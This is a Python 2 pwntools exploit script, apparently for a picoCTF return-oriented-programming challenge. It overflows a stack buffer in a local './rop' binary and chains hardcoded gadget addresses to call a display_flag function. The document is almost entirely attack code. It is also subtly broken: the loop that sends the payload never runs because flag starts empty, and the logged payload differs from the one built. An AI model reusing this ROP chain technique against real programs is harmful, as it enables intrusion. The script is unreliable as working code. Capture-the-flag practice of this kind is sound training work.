#coding=utf-8
from pwn import *

leapA = 0x565556dd
leap2 = 0x565556f4
leap3 = 0x5655575d
leap3_win3 = 0x56555787
display_flag = 0x565557aa

# add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
give_ebp = 0x56555985

buf = 0xffffd4b0
ret = 0xffffd4cc

flag = ''
payload = 'a' * (ret - buf) 
payload += p32(leapA)
payload += p32(leap3)
payload += p32(give_ebp)
payload += 'a' * 0xc

payload += p32(leap3_win3)
payload += p32(leap2) 
payload += p32(display_flag) 
payload += p32(0xdeadbeef) 

log.info(('a' * (ret - buf) + p32(leapA) + p32(leap3) + p32(leap2) + p32(display_flag) + p32(0xdeadbeef)).encode('hex'))
while  flag:
    p = process('./rop')
    p.sendline(payload)
    res = p.recvall(1)
    if 'picoCTF' in res:
        flag = res
        print flag
